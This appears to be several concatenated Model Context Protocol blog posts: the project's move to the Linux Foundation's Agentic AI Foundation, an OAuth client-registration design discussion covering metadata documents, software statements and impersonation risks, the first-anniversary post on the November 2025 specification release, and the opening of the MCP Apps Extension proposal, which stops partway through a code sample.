Anthropic is donating MCP to the Agentic AI Foundation, a directed fund under the Linux Foundation. MCP will become a founding project of the newly created foundation.\n\nIn one year, MCP has become one of the fastest-growing and widely-adopted open-source projects in AI: Over 97 million monthly SDK downloads, 10,000 active servers and first-class client support across major AI platforms like ChatGPT, Claude, Cursor, Gemini, Microsoft Copilot, Visual Studio Code and many more.\n\nSince its inception, we've remained committed to ensuring MCP remains open and community-driven. This move formalizes that commitment—ensuring MCP's vendor-neutrality and long-term independence under the same neutral stewardship that supports Kubernetes, PyTorch, and Node.js. Anthropic's commitment to MCP is unchanged: we will continue to invest in its development, maintain core infrastructure, and actively participate in the community.\n\n## The Agentic AI Foundation\n\nMCP will be a founding project of the newly created Agentic AI Foundation (AAIF), a directed fund under the Linux Foundation, co-founded by Anthropic, Block and OpenAI, with support from Google, Microsoft, AWS, Cloudflare and Bloomberg to advance open-source innovation in agentic AI.\n\nMCP joins two other founding projects: goose by Block and AGENTS.md by OpenAI as founding projects.\n\nThe AAIF Governing Board will make decisions regarding strategic investments, budget allocation, member recruitment, and approval of new projects, while individual projects, such as MCP, maintain full autonomy over their technical direction and day-to-day operations.\n\n## MCP's maintainer structure stays the same\n\nFor MCP little changes. The governance model we introduced earlier this year continues as is. The people making decisions about the protocol are still the maintainers who have been stewarding it, guided by community input through our SEP process.\n\nThe Linux Foundation provides a neutral home and infrastructure that allows maintainers to operate independently, and will not dictate the technical direction of MCP.\n\n## Thank you\n\nTo all who've adopted and contributed to MCP so far, thank you. None of this would've been possible without your contribution. From building servers to maintaining SDKs to filing issues to improving documentation to welcoming new visitors and everything in between, you've made MCP what it is today.\n\nHere's to MCP's next chapter under the Linux Foundation's stewardship.\n"}

A key part of the authorization flow that MCP is particularly reliant on is **client registration**.\n\nThis is especially important in a world where clients and servers don't have a pre-existing relationship - we can't assume that we will always know which MCP clients will connect to which MCP servers. This design highlights two challenges that need to be addressed:\n\n- Operational issues with managing client IDs via [Dynamic Client Registration](https://datatracker.ietf.org/doc/html/rfc7591) (DCR)\n- Preventing client impersonation\n\nIf you're already familiar with OAuth and the current state of client registration in MCP, skip to [Two Distinct Challenges in MCP Client Registration](#two-distinct-challenges-in-mcp-client-registration).\n\n## Background on OAuth\n\nA protected MCP server that implements OAuth 2.1 should allow a user to grant a client access to itself and prevent attempts to trick the user into granting access to a client they didn't intend to use via phishing.\n\nThe authorization flow can be best described by looking at this sequence diagram:\n\n```mermaid\nsequenceDiagram\n   participant Client\n   participant User\n   participant AuthServer as Authorization Server\n   participant Resource as Resource Server\n\n   Client->>User: 1. Redirect to authorization server\n   User->>AuthServer: Navigate to auth URL\n   AuthServer->>User: 2. Display consent screen\n   User->>AuthServer: Approve access\n   AuthServer->>Client: 3. Redirect with authorization code\n   Client->>AuthServer: 4. Exchange code for access token\n   AuthServer-->>Client: Access token (saved)\n   Client->>Resource: 5. Request with access token\n   Resource-->>Client: Protected resource\n```\n\nThis flow requires a few steps to be performed to acquire an access token:\n\n1. The client directs the user to an authorization UI provided by the authorization server\n2. The authorization server displays a consent screen to the user\n3. User approves client access and the authorization server redirects the user back to the client with an access code\n4. Client exchanges the access code for a set of tokens, which are cached locally\n5. Client uses the access token to access the MCP server\n\nTo be able to initiate this flow, however, the authorization server first needs some basic information about the client that is kicking off the authorization process:\n\n1. **Client name**: Human readable text to display in the consent screen to help the user decide whether they want to grant access.\n2. **Redirect URL**: The destination to send the authorization code back to if the user consents.\n\nIn order to prevent a malicious client from tricking a user into granting access they didn't intend to grant, the authorization server must be able to trust the client information it has.\n\nFor example, a malicious client could claim to be `Claude Desktop` on the consent screen while actually being owned by someone not affiliated with Claude Desktop developers. Seeing the client information on the consent screen, users might grant access thinking they're authorizing the legitimate Claude Desktop, not realizing that some malicious client now has access to their account.\n\n## Improving Client Registration in MCP\n\nFor MCP users, a common pattern is to connect to an MCP server by using its URL directly in an MCP client.\n\nThis goes against the typical OAuth authorization pattern because the user is selecting the resource server to connect to rather than the client developer. This problem is compounded by the fact that there is an unbounded number of authorization servers that an MCP server may use, meaning that clients need to be able to complete the authorization flow regardless of the provider used.\n\nSome client developers have implemented pre-registration with a select few authorization servers. In this scenario, the client doesn't need to rely on DCR when it detects an authorization server it knows. However, this is a solution that doesn't scale given the breadth of the MCP ecosystem - it's impossible to have every client be registered with every authorization server there is.\nTo mitigate this challenge, we set out to outline some of the goals that we wanted to achieve with improving the client registration experience:\n\n1. **Clients**: Client developers don't need to implement pre-registration and distribute a client ID for each authorization server MCP servers might be using.\n2. **Users**: Users don't need to go through a pre-registration process themselves and manually specify a client ID for every MCP server they connect to.\n3. **Authorization servers**:\n\n- **Trust in Metadata**: Authorization servers have a way to trust the metadata they associate with a client, such as name and redirect URL.\n- **Single Client ID per App**: Authorization servers can have a single client ID per client for governance and management purposes\n- **Selective Allow/Deny**: Authorization servers can selectively allow or deny clients based on their policies.\n- **Database Management**: Authorization servers do not need to handle an unbounded database or expiration flows for every new client registration.\n\nCurrently, none of our existing client registration approaches satisfy all of these requirements. Pre-registration requires too much effort in a highly variable setting (unbounded number of clients connecting to unbounded number of servers), while DCR reduces effort but creates operational issues that a lot of the authorization servers are not ready to tackle yet.\n\n## Two Distinct Challenges in MCP Client Registration\n\nAfter extensive discussion with MCP server implementers, we've identified that a few competing solutions to the registration problem were addressing two distinct issues:\n\n1. **Operational limitations** of Dynamic Client Registration in open environments\n2. **Client identity and impersonation** risks across different deployment scenarios\n\n## **Challenge 1: Operational Limitations of Dynamic Client Registration**\n\n### **The DCR Model Mismatch**\n\nThe DCR design takes the pre-registration pattern available in modern OAuth-based authorization servers and makes it available via an API. In fully open environments like MCP, DCR really puts the spotlight on a few operational challenges that an open registration endpoint introduces:\n\n**For authorization servers:**\n\n- **Unbounded database growth**: Every time a user connects a client to an MCP server, a new registration is created with the authorization server unless the client already has one. Registrations are also not portable, so using Claude Desktop on your Windows machine, and then jumping to Claude Desktop on macOS will create two distinct client registrations.\n- **Client expiry \"black hole\"**: There's no way to tell a client that its ID is invalid without creating an open redirect vulnerability. Clients have to implement their own heuristics for client ID management.\n- **Per-instance confusion**: Each client instance typically gets its own client ID even when using the same application, but on different machines or across different users. From an auditing perspective, an authorization server administrator may see hundreds (if not thousands) of records for the same application without any rhyme or reason.\n- **Denial-of-Service vulnerability**: An unauthenticated `/register` endpoint writes to a database within the authorization server, meaning that tenant admins now need to worry about rate limiting or policy controls (e.g., hosts allowed to register clients).\n\n**For clients:**\n\n- **Extra overhead**: Managing registration state and another secret beyond access/refresh tokens\n- **No validity checking**: Can't verify if a client ID is still valid\n- **Unclear lifecycle**: No guidance on when to re-register or update credentials\n\n### **Solution: Client ID Metadata Documents (CIMD)**\n\nClient ID Metadata Documents (CIMD), described in [OAuth Client ID Metadata Document](https://www.ietf.org/archive/id/draft-parecki-oauth-client-id-metadata-document-03.html) and implemented by Bluesky, elegantly sidestep these operational issues.\n\nInstead of a registration step, clients use an HTTPS metadata URL as their client ID directly. The server fetches the metadata from the URL at authorization time:\n\n```mermaid\nsequenceDiagram\n   participant Client\n   participant AuthServer\n   participant MetadataURL\n\n   Client->>AuthServer: Authorization request (client_id=https://app.com/oauth.json)\n   AuthServer->>MetadataURL: GET https://app.com/oauth.json\n   MetadataURL-->>AuthServer: {name: \"App\", redirect_uris: [...]}\n   AuthServer->>Client: Show consent screen & continue flow\n```\n\nThis addresses all the operational issues:\n\n- **No unbounded database growth**: Servers fetch metadata on-demand (can cache for performance)\n- **No expiry management**: The URL is the ID \\- it doesn't expire\n- **Natural per-app model**: One URL per application, not per user\n- **No registration endpoint**: No unauthenticated write operations\n\nThe cost? Clients need to host a metadata document at an HTTPS URL. For web applications, this is trivial. For desktop applications, this typically means hosting on their backend infrastructure.\n\n## **Challenge 2: Client Identity and Impersonation**\n\nThe second challenge is orthogonal to the DCR vs. CIMD debate \\- it's about trusting that a client is who it claims to be. This problem will exist regardless of how the registration process is implemented.\n\nFor web-based clients, trust is more straightforward, as we have an HTTPS domain that's tied to a certificate authority. For desktop clients, if the client can't offload its authorization to existing backend infrastructure, there is difficulty trusting the client is legitimate and unmodified.\n\n### The Trust Spectrum\n\nWe can map impersonation scenarios on two axes: attacker cost and mitigation complexity.\n\n![Mitigation Cost vs Attack Cost](mitigation-attack-cost.png)\n\n**Low attacker cost/Low mitigation complexity: Domain-based attacks**\n\n- **Attack**: Register malicious callback URI and claim to be `Claude Desktop`\n- **Cost**: Trick user into clicking a link and consenting\n- **Mitigation**:\n  - Restrict trusted domains/URLs\n  - Show warnings for unknown domains\n  - Works with both DCR and CIMD\n\n**Medium attacker cost/Medium mitigation complexity: `localhost` impersonation**\n\n- **Attack**: Run malicious app on `localhost:8080`, impersonate legitimate client\n- **Cost**: Trick user into running a malicious application (plus consenting for that app to have data access)\n- **Problem**: Desktop apps can't hold secrets, hard to prove identity\n\n**High attacker cost/High mitigation complexity: Platform-attested applications**\n\n- **Attack**: Get malicious client signed by a trusted authority\n- **Cost**: Extremely high \\- requires compromising certification vendor processes\n- **Mitigation**: platform system-level attestation (future work)\n\n### **Solution: Software Statements for Desktop Applications**\n\nTo broadly solve the client impersonation for the middle tier as well as to prevent `localhost` impersonation we need signed software statements. Implementing this would require:\n\n1. Client hosts a JSON Web Key Set (JWKS) on their backend\n2. Client authenticates the user through their own flow\n3. The client-owned backend service issues a short-lived, signed JWT attesting to the client's identity\n4. Client includes this JWT in the OAuth flow\n5. Authorization server verifies the JWT against the trusted JWKS\n\nThis dramatically raises the bar for client impersonation, as an attacker would need to:\n\n- Compromise the client's backend infrastructure, or\n- Successfully impersonate the client's authentication flow\n\nCrucially, **software statements work with both DCR and CIMD**. They're not a competing solution \\- they're a complementary security layer.\n\n### **Future: Platform-Level Attestation**\n\nThe strongest protection would be platform-level attestation, e.g. having macOS, Windows, or Android attest that a piece of software is legitimate.\n\nHaving OS-level attestation would make client impersonation unreasonably expensive. While the exact way this ties into a software statement is yet to be prototyped, the general direction is threading platform-level application identity validation through to the OAuth flow.\n\n## **The Complementary Path Forward**\n\nWhile we're looking at all available options, it's important to note that we're not choosing between solutions. We're exploring complementary approaches for distinct problems:\n\n**For operational issues**: We are looking at adding CIMD support in favor of DCR\n\n- Keep DCR for backward compatibility\n- Recommend CIMD for new implementations\n- Both achieve the same authorization goal\n\n**For trust issues**: Layering software statements on top\n\n- Optional enhancement for both DCR and CIMD\n- Required only when `localhost` impersonation is a concern\n- Authorization servers choose their required trust level\n\n## **Security Considerations**\n\nBoth CIMD and software statements require authorization servers to make outbound HTTPS requests, potentially to untrusted domains. Implementations must:\n\n- Prevent SSRF attacks by blocking internal network access\n- Implement timeouts and size limits\n- Consider caching strategies for performance\n- Validate response formats strictly\n\nIf we adopt these approaches, we’ll need good best practices and SDK support to help avoid vulnerabilities and provide a easy path for implementors.\n\n## **Next Steps**\n\nDiscussions for these approaches are happening in the [Specification Enhancement Proposals](https://modelcontextprotocol.io/community/sep-guidelines) (SEP):\n\n- [SEP-991: Client ID Metadata Documents](https://github.com/modelcontextprotocol/specification/discussions/991)\n- [SEP-1032: Software Statements with DCR](https://github.com/modelcontextprotocol/specification/discussions/1032)\n\nGet involved: Join the conversation in [Discord](https://discord.gg/6CSzBmMkjX) (the \\#auth-wg-client-registration channel) or comment on the SEPs directly.\n\nA big thank to the following folks for help with this blog post: Den Delimarsky, Aaron Parecki, Geoff Goodman, Andrew Block, Pieter Kasselman, Abhishek Hingnikar, and Bobby Tiernay.\n"}

You can check out the [original announcement blog post](https://www.anthropic.com/news/model-context-protocol) if you don't believe us. It's hard to imagine that a little open-source experiment, a **protocol to provide context to models**, became the de-facto standard for this very scenario in less than twelve months.\n\nBut not only do we hit the first anniversary milestone today - we're also releasing a brand-new MCP specification version. Before we get to the details of what's new, let's do a bit of a retrospective.\n\n## A Year In\n\nWith all the changes that we've made in the past year, it feels like a decade flew by. The protocol has grown leaps and bounds since its inception and has been adopted by a _huge_ number of developers and organizations. We went from a little open source experiment to becoming _the_ standard for connecting data and applications to Large Language Models (LLMs).\n\nBut adoption can only grow as long as there are MCP servers to actually use and clients which are capable of communicating with them. Within the same timeframe, we saw the number of active MCP servers go from just a few experimental ones to _thousands_. If you think about a scenario, it's likely there's an MCP server for it.\n\nHere are just a few of many (very many) MCP servers that you can try _today_:\n\n- Notion [built an MCP server](https://github.com/makenotion/notion-mcp-server) to help you manage your notes.\n- Stripe has a [pretty extensive MCP server](https://docs.stripe.com/mcp#tools) to manage all kinds of payment workflows.\n- GitHub [built their own MCP server](https://github.com/github/github-mcp-server) to help developers automate their engineering processes.\n- Hugging Face [created an MCP server](https://github.com/huggingface/hf-mcp-server) to make model management and dataset search a breeze.\n- Postman [built their MCP server](https://github.com/postmanlabs/postman-mcp-server) to help automate API testing workflows.\n\nAnd there's so much more to discover in the MCP ecosystem! That's why we also launched the [MCP Registry](https://blog.modelcontextprotocol.io/posts/2025-09-08-mcp-registry-preview/) earlier this year. It's the central index for all available MCP servers that now has close to two thousand entries since its announcement in September. That's a **407% growth** from the initial batch of servers we onboarded that same month.\n\nThe ecosystem is blooming, adoption is growing, but what's underpinning all of this?\n\n### Community & Governance\n\nMCP's growth was never a one‑company effort. Students, hobbyists, startup engineers, and enterprise architects all shaped the protocol - submitting Specification Enhancement Proposals (SEPs), shipping SDKs in new languages, and stress‑testing some of the early assumptions we had about MCP in production. MCP servers became a staple of many products, official and unofficial (there's even a [Blender MCP server](https://github.com/ahujasid/blender-mcp)). That kind of organic adoption isn't something you can just come up with, no matter how ambitious your aspirations are with an open source project.\n\n![David Soria Parra presenting on MCP in May of 2025](/posts/images/first-mcp-anniversary/david-mcp-may.webp)\n\nFrom the start, we believed that it was all about the **MCP community**. Our community rallied around the protocol, organizing events like [MCP Dev Summit](https://mcpdevsummit.ai/), [MCP Night](https://workos.com/mcp-night), [MCP Dev Days](https://developer.microsoft.com/en-us/reactor/series/S-1563/), and showing up at other marquee events like [AI Engineer World's Fair](https://wf2025.ai.engineer/worldsfair/2025) to share what they learned and built.\n\n![Presentation on GitHub MCP server at the MCP Night event](/posts/images/first-mcp-anniversary/mcp-night-github-mcp.webp)\n\nWe also nurtured large contributor communities on [Discord](https://modelcontextprotocol.io/community/communication) and on [GitHub](https://github.com/modelcontextprotocol/modelcontextprotocol), helping us debug issues, build amazing tools like the [MCP Inspector](https://github.com/modelcontextprotocol/inspector), propose changes, and assist each other in shipping great MCP experiences. That kind of daily collaboration got us further than any single individual or company ever could.\n\n![Audience at MCP Night in San Francisco](/posts/images/first-mcp-anniversary/mcp-night.webp)\n\nReally, the success of MCP in the past year is entirely thanks to the broad community that grew around the project - from transports, to security, SDKs, documentation, samples, extensions, and developer tooling, it was all significantly evolved by and for the community.\n\n![Kent C. Dodds talking about his vision for MCP at MCP Dev Summit](/posts/images/first-mcp-anniversary/kent-jarvis-mcp.webp)\n\nTo keep this pace sustainable, we spent some time thinking through and putting together a [governance structure](https://blog.modelcontextprotocol.io/posts/2025-07-31-governance-for-mcp/). Through it, community leaders and Anthropic maintainers were and continue to work together to figure out what needs fixing and how to get the right changes into the spec. Our maintainer team isn't there to gatekeep; they help surface problems, align on solutions, and turn rough ideas into actual protocol updates.\n\n![MCP maintainers collaborating during a writing session in New York City](/posts/images/first-mcp-anniversary/maintainers-write.webp)\n\nOur approach to governance, while still evolving, proved itself to be extremely valuable. We've been able to move faster on critical improvements without breaking existing implementations. Potential contributors now also know how to jump in through formal **Working and Interest Groups** ([SEP-1302](https://github.com/modelcontextprotocol/modelcontextprotocol/issues/1302/) set the stage for this).\n\n![Group photo from an MCP maintainers meetup](/posts/images/first-mcp-anniversary/maintainers-meetup.webp)\n\nEven though this is a significant improvement, we know that we're not done. There's still work ahead for us to make this process even better - improved transparency, decision timelines, broader platform coverage, and so much more to help the ecosystem. We are _incredibly thankful_ for everyone who's been part of this journey and helped us navigate so many changes in such a short time span.\n\n![Developing on the bleeding edge of MCP servers presentation](/posts/images/first-mcp-anniversary/mcp.webp)\n\n## What Others Have To Say\n\nAs we called out above, the success of MCP _would not be possible_ without the broader community of adopters. We're delighted that the protocol enabled so many scenarios across the industry. Here are some thoughts from a few of our key partners and supporters.\n\n> \"_In just one year, MCP has evolved from an experiment to a widely adopted industry standard, highlighting the impact of open collaboration—something we deeply believe in at GitHub. Developers across our community, customers and own teams are using our GitHub MCP Server, Registry, and enterprise controls like the MCP allowlist to unlock real benefits of agentic development in production workflows.

The hobbyist that has something working in production might have a practical opinion to contribute, that the big tech engineer can pick up and confidently deploy to a large userbase.

Let's now jump into the latest big release - the `2025-11-25` version of the MCP specification.\n\n## The November 2025 Release\n\nThe latest release of the MCP specification ships with a number of highly-anticipated features that came directly from our community deploying and using MCP for production scenarios. People told us what wasn't working, what was missing, and what papercuts prevented them from being able to use MCP. We listened and worked together with community experts to deliver a number of enhancements that make MCP even more scalable and reliable.\n\n### Support for Task-based Workflows\n\n**SEP:** [1686](https://github.com/modelcontextprotocol/modelcontextprotocol/issues/1686)\n\nTasks provide a new abstraction in MCP for tracking the work being performed by an MCP server. Any request can be augmented with a task that allows the client to query its status and retrieve its results up to a server-defined duration after the task is created.\n\nTasks support a variety of states including `working`, `input_required`, `completed`, `failed`, and `cancelled`, allowing clients to effectively manage multi-step operations.\n\nSome noteworthy capabilities that this feature enables:\n\n- **Active polling**: Clients can check the status of ongoing work at any time.\n- **Result retrieval**: Results of completed tasks are accessible after the request has completed.\n- **Flexible lifecycle management**: Support for `working`, `input_required`, `completed`, `failed`, and `cancelled` states.\n- **Task isolation**: Proper security boundaries with session-based access control.\n\nFrom the multitude of MCP servers that we've seen out there, this is particularly helpful for scenarios such as the ones below.\n\n- Healthcare & life sciences data analysis that processes hundreds of thousands of data points\n- Enterprise automation platforms with complex multi-step workflows\n- Code migration tools that run for minutes or hours\n- Test execution platforms that need to stream logs from long-running suites\n- Deep research tools that spawn multiple agents internally\n- Multi-agent systems where agents can work concurrently\n\nTasks are launching as an **experimental capability**, meaning that it's part of the core protocol but it's not yet finalized. Task-based workflows are a tough problem to solve at scale, so we want to give some time to the specification to be battle-tested in real-world scenarios. We'll work closely with the community, SDK developers, as well as client and server implementers to get this right.\n\n### Simplified Authorization Flows\n\nOne of the top painpoints from the community when it comes to authorization has been [Dynamic Client Registration](https://www.rfc-editor.org/rfc/rfc7591), or DCR. This capability is needed because in the MCP world there is an unbounded number of clients and servers, so doing standard client pre-registration is not always feasible. You wouldn't expect every MCP client in the world to also have a client registration with every Authorization Server (AS) out there, so DCR was used as a solution to this problem. You can learn more about the current approach in our [authorization guide](https://modelcontextprotocol.io/docs/tutorials/security/authorization).\n\nTo use DCR, however, a MCP server developer would need to rely on an AS that allows clients to register themselves via a public API. If the AS doesn't support this capability, developers would now need to build an OAuth proxy that would be manually registered with the AS, and support Dynamic Client Registration itself, mapping its own issued tokens to tokens issued from the downstream AS. This is a complex, time-consuming, and error-prone task, and doesn't actually solve the fundamental problems with Dynamic Client Registration.\n\nThe alternative would be for every customer or end user to provide _their own_ client registration, but that's just trading one complex task for another. In that model, when a user connects to a MCP server, they need to go through their IT team to create a registration, assign it the right permissions, and then configure the MCP client to use it.\n\n**[SEP-991](https://github.com/modelcontextprotocol/modelcontextprotocol/pull/1296)** introduced a much more elegant solution to the problem - URL-based client registration using [OAuth Client ID Metadata Documents](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-client-id-metadata-document-00) (you might've already seen our [blog post on this change from earlier this year](https://blog.modelcontextprotocol.io/posts/client_registration/)). Clients can now provide their own client ID that is a URL pointing to a JSON document the client manages that describes properties of the client.\n\nYou can learn more in the [Client ID Metadata Documents Flow](https://modelcontextprotocol.io/specification/2025-11-25/basic/authorization#client-id-metadata-documents-flow) section of the [MCP authorization specification](https://modelcontextprotocol.io/specification/2025-11-25/basic/authorization).\n\n### Security and Enterprise Features\n\nAs the protocol matures, we also can't ignore the myriad of security and authentication/authorization needs. MCP is not just a hobby protocol - we've seen it adopted in some of the most mission-critical workloads. This translates into a direct need to ensure that all data is protected and access is properly managed.\n\nWorking with security and authentication experts from across the community, we've developed a number of enhancements shipping with this release:\n\n- **[SEP-1024](https://github.com/modelcontextprotocol/modelcontextprotocol/issues/1024)**: Client security requirements for local server installation\n- **[SEP-835](https://github.com/modelcontextprotocol/modelcontextprotocol/issues/835)**: Default scopes definition in authorization specification\n\nWe also hear loud and clear from the industry that discovery and management of internal registries is an important component to the MCP story. With the help of the MCP Registry team, we've also established a [vision for the ecosystem](https://github.com/modelcontextprotocol/registry/blob/main/docs/design/ecosystem-vision.md) that will help enterprises adopt _their own_ MCP registries, with self-managed governance controls and security coverage.\n\nTo learn more about other upcoming auth and security improvements you can follow the [`auth`](https://github.com/modelcontextprotocol/modelcontextprotocol/issues?q=is%3Aissue%20state%3Aopen%20label%3Aauth) and [`security`](https://github.com/modelcontextprotocol/modelcontextprotocol/issues?q=is%3Aissue%20state%3Aopen%20label%3Asecurity) tags in the specification repository.\n\n### Extensions\n\nAs MCP continues to evolve, we _constantly_ hear from developers who want to extend the protocol with specialized capabilities, whether for UI interactions, custom authentication flows, or other environment-specific logic. While these additions could be valuable, incorporating them directly into the core specification isn't always practical from the get-go, especially when a feature hasn't yet achieved broad adoption or proven its universal applicability.\n\nTo address this, we're introducing **extensions** in the protocol. Extensions are components and conventions that operate outside the core specification, providing a flexible way to build scenario-specific additions that follow MCP conventions without requiring full protocol integration. This approach allows for experimentation and specialized use cases while keeping the core protocol focused and stable. With extensions, we can move faster and enable developers to _test out_ protocol capabilities before they become part of the specification.\n\nExtensions are:\n\n- **Optional**. Server and client implementors can choose to adopt these extensions.\n- **Additive**. Extensions do not modify or break core protocol functionality; they add new capabilities while preserving core protocol behavior.\n- **Composable**. Extensions are modular and designed to work together without conflicts, allowing implementations to adopt multiple extensions simultaneously.\n- **Versioned independently**. Extensions follow the core MCP versioning cycle but may adopt independent versioning as needed.\n\nYou might've already seen our announcement of the [MCP Apps Extension](https://blog.modelcontextprotocol.io/posts/2025-11-21-mcp-apps/) proposal. In this specification release, we're introducing a couple of other extensions that should help developers further.\n\n### Authorization Extensions\n\nTo make MCP better suited for environments that require specific levels of control over the authorization process, we've officially introduced the concept of [**authorization extensions**](https://github.com/modelcontextprotocol/ext-auth) (building on the broader [MCP Extensions](#extensions)). As with all other extensions, authorization extensions build on the core protocol and define additional authorization mechanisms that can be implemented by both server and client developers.\n\nThe first two authorization extensions came on the heels of community feedback regarding some of the most-used authorization flows:\n\n- **[SEP-1046](https://github.com/modelcontextprotocol/modelcontextprotocol/issues/1046)**: OAuth client credentials support for machine-to-machine authorization\n- **[SEP-990](https://github.com/modelcontextprotocol/modelcontextprotocol/issues/990)**: Enterprise IdP policy controls for MCP OAuth flows (Cross App Access). This enables users within an enterprise to sign in to the MCP client once, and immediately get access to every authorized MCP server without additional authorization prompts.\n\nAs we engage closer with the community, we expect the number of authorization extensions to grow as well - after all, there are more than just a few ways for a system to acquire and manage credentials.\n\n### URL Mode Elicitation: Secure Out-of-Band Interactions\n\n**SEP:** [1036](https://github.com/modelcontextprotocol/modelcontextprotocol/issues/1036)\n\nAsking users for their API keys, tokens, or any other credentials directly through the MCP client might seem like quite a scary proposition. This is especially critical when you need to connect an MCP server to an array of _other_ APIs, where the traditional client-to-server authorization flow doesn't quite work. Until now, there wasn't a good alternative - you either had to trust the client to handle the user's credentials directly, or implement a bunch of custom authorization logic to be used from the start.\n\n**URL mode elicitation** lets you send users to a proper OAuth flow (or any credential acquisition flow, for that matter) in their browser, where they can authenticate securely without your client ever seeing the entered credentials. The credentials are then directly managed by the server and the client only needs to worry about its own authorization flow to the server.\n\nWe are excited about including this feature in addition to capabilities that we already have, like elicitations, because it allows the protocol to be used for a few scenarios that were quite hard to get right, such as:\n\n- **Secure credential collection**: API keys and passwords never transit through the MCP client\n- **External OAuth flows**: MCP servers have a path to obtain third-party authorization without token passthrough\n- **Payment processing**: PCI-compliant financial transactions with secure browser contexts can now be done outside the client\n\nAll the server does is send a URL that the client will provide an affordance for. When the user completes the flow in their browser, the server will get the necessary tokens _directly_, avoiding sharing credentials with the client or other manual steps. Simple!\n\n### Sampling with Tools: Agentic Servers\n\n**SEP:** [1577](https://github.com/modelcontextprotocol/modelcontextprotocol/issues/1577)\n\nThis functionality allows MCP servers to run their own agentic loops using the client's tokens (still under the user's control, of course), and reduces the complexity of client implementations, context support becoming explicitly optional. This came from the fact that [sampling](https://modelcontextprotocol.io/specification/2025-06-18/client/sampling) doesn't support tool calling, although it's a cornerstone of modern agentic behaviour. With the new spec release, this is no longer a gap!\n\nNow that sampling with tools is available, this also means that all of the scenarios below are possible!\n\n- **Tool calling in sampling requests**: Servers can now include tool definitions and specify tool choice behavior\n- **Server-side agent loops**: Servers can implement sophisticated multi-step reasoning\n- **Parallel tool calls**: Support for concurrent tool execution\n- **Better context control**: The ambiguous `includeContext` parameter is being soft-deprecated in favor of explicit capability declarations\n\nAs an example, a research server can spawn multiple agents internally, coordinate their work, and deliver a coherent result while using nothing other than standard MCP primitives without custom scaffolding or complex orchestration code.\n\n### Developer Experience Improvements\n\nOne of the core tenets of MCP is _simplicity_ - we want to make the developer and integration experience as intuitive and easy as possible. To help achieve this, the latest spec release also adds a few minor changes that help make the protocol easier to use for developers.\n\n- **[SEP-986](https://github.com/modelcontextprotocol/modelcontextprotocol/issues/986)**: Standardized format for tool names\n- **[SEP-1319](https://github.com/modelcontextprotocol/modelcontextprotocol/issues/1319)**: Decoupled request payload from RPC methods definition\n- **[SEP-1699](https://github.com/modelcontextprotocol/modelcontextprotocol/issues/1699)**: SSE polling via server-side disconnect for better connection management\n- **[SEP-1309](https://github.com/modelcontextprotocol/modelcontextprotocol/issues/1309)**: Improved specification version management for SDKs\n\n## Looking Forward\n\nThis release is backward compatible. Your existing implementations keep working. The new features are there when you need them.\n\nLooking ahead, we're excited about what's coming next for MCP. The protocol is entering a new phase, one where it's not just about connecting LLMs to data, but about enabling entirely new categories of AI-powered applications.\n\nWe're seeing early signals of this transformation already. Developers are building multi-agent systems that coordinate across dozens of MCP servers. Enterprise teams are deploying MCP at scale with sophisticated security and governance controls. Startups are launching products where MCP is the core architectural pattern. MCP servers are even being transformed into executable code, to create sandboxed agent workflows.\n\nThe [roadmap ahead](https://modelcontextprotocol.io/development/roadmap) includes deeper work on reliability and observability, making it easier to debug and monitor complex MCP deployments. We're exploring better patterns for server composition, allowing you to build sophisticated capabilities by combining simpler building blocks. And we're continuing to refine the security model to meet the needs of the most demanding enterprise environments.\n\nWhat excites us most isn't what _we're_ planning to build but what _our community_ is going to build. Every week we see MCP servers designed, developed, and deployed in novel ways. Every conversation in Discord reveals new use cases and patterns. The protocol has become a canvas for AI innovation, and we can't fill it alone.\n\nThe next year of MCP will be shaped by more production deployments, more real-world feedback, amplified by the creativity of thousands of developers worldwide. We're here to support that growth, to ensure the protocol evolves thoughtfully, and to keep MCP stable, secure, and simple as it scales.\n\n## Get Started\n\nTo get started with all the new goodness in the latest MCP specification release, check out the following resources:\n\n- **Read the changelog**: All major changes are captured in our [Key Changes document](https://modelcontextprotocol.io/specification/2025-11-25/changelog)\n- **Get to know our docs**: The [MCP documentation](https://modelcontextprotocol.io/docs/getting-started/intro) is the source of truth for the all the inner workings of the protocol\n- **Join the discussion**: If you would like to contribute or engage with other MCP maintainers, start with our [GitHub repo](https://github.com/modelcontextprotocol/modelcontextprotocol) and [Discord](https://modelcontextprotocol.io/community/communication#discord)\n"}

While this works well for many use cases, it creates friction when tools need to present visual information or gather complex user input.\n\nFor example, consider a data visualization MCP server that returns chart data as JSON. The host application must interpret that data and render it. Handling all kinds of specialized data in this scenario translates to a significant burden for client developers, who would need to build their own logic to render the UI. As more UI requirements come up, like the need to collect multiple related settings from users, the complexity balloons. Alternatively, without UI support, these interactions become awkward exchanges of text prompts and responses.\n\nThe MCP community has been creative in working around these limitations, but different implementations using varying conventions and architectures make it harder for servers to work consistently across clients. This lack of standardization creates a real risk of ecosystem fragmentation - something we're working to proactively prevent.\n\n## Building together\n\nThe [MCP-UI project](https://github.com/MCP-UI-Org/mcp-ui), created by [Ido Salomon](https://github.com/idosal) and [Liad Yosef](https://github.com/liady) and maintained by a dedicated community, spearheaded the vision of agentic apps with interactive interfaces. The project developed patterns for delivering rich user interfaces as first-class MCP resources, proving that agentic apps fit naturally within the MCP architecture. The project is backed by a large community and provides [rich SDKs](https://mcpui.dev/guide/client/overview), adopted at leading companies and projects such as Postman, Shopify, Hugging Face, Goose, and ElevenLabs.\n\nThe [OpenAI Apps SDK](https://developers.openai.com/apps-sdk/) further validated the demand for rich UI experiences within conversational AI interfaces. The SDK enables developers to build rich, interactive applications inside ChatGPT using MCP as its backbone. To ensure interoperability and establish consistent security and usage patterns across the ecosystem, Anthropic, OpenAI, and MCP-UI are collaborating to create an official MCP extension for interactive interfaces.\n\n![Example of a fullscreen app with a rich data table interface](/posts/images/fullscreen-chat-app.png)\n\n## MCP Apps Extension specification\n\nWe're proposing a specification for UI resources in MCP, but the implications go further than just a set of schema changes. The MCP Apps Extension is starting to look like an agentic app runtime: a foundation for novel interactions between AI models, users, and applications. The proposal is intentionally lean, starting with core patterns that we plan on expanding over time.\n\n### Key design decisions\n\n#### Pre-declared resources\n\nUI templates are resources with the `ui://` URI scheme, referenced in tool metadata.\n\n```ts\n// Server registers UI resource\n{\n  uri: \"ui://charts/bar-chart\",\n  name: \"Bar Chart Viewer\",\n  mimeType: \"text/html+mcp\"\n}\n\n// Tool references it in metadata\n{\n  name: \"visualize_data_as_bar_chart\",\n  description: \"Plots some data as a bar chart\",\n  inputSchema: {\n    type: \"object\",\n    properties: {\n      series: { type: \"array\", items: .... }\n    }\n  },\n  _meta: {\n    \"ui/resourceUri\": \"ui://charts/bar-chart\",\n  